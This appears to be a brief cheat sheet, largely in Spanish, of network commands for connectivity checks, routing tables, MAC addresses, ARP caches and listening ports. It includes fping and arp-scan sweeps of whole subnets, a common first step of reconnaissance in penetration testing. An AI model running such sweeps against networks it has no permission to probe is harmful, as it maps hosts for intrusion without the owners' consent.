Network
  • Conectividad
    1. PING 
      ping -c 1 [DNS]
    2. FPING: enviara sondas de eco ICMP a multiples hosts.
      Prefix: Link de consulta 
      fping -I eth0 -g [DNS]/prefix -a 2>/dev/null
      fping -I eth0 -g 10.10.10.1/24 -a 2>/dev/null
    3. ARP-SCAN 
      arp-scan -I eth0 -g [DNS]
      arp-scan -I eth0 -g [DNS]/prefix
  • Routing Tables
    1. Linux 
      ip a s
      ip route
    2. Linux 
      route
    3. Windows 
      route print
    4. OSX 
      netstat -r
    5. Configuración de tabla de enrutamiento 
      ip route add [IP]/[Classless inter-Domain Routing (CIDR)] via [Gateway]
    6. Configuración de tabla de enrutamiento 
      ip route add 192.168.224.2/24 via 10.75.32.1
  • Dirección MAC de la tarjeta de red
    1. Linux or MAC 
      ifconfig
    2. Linux 
      ip addr
    3. Windows 
      ipconfig
  • Comprobación de cache ARP en nuestro host
    1. Linux 
      ip neighbour
    2. Windows 
      arp -a
    3. *nix operating systems 
      arp
  • Netstat Comprobación de puertos de escucha y conexiones Actuales (TCP) en un host
    1. Linux 
      netstat -tunp
    2. Linux 
      netstat -p tcp -p udp
    3. Linux 
      lsof -n -i4TCP -i4UDP
    4. Windows 
      netstat -ano
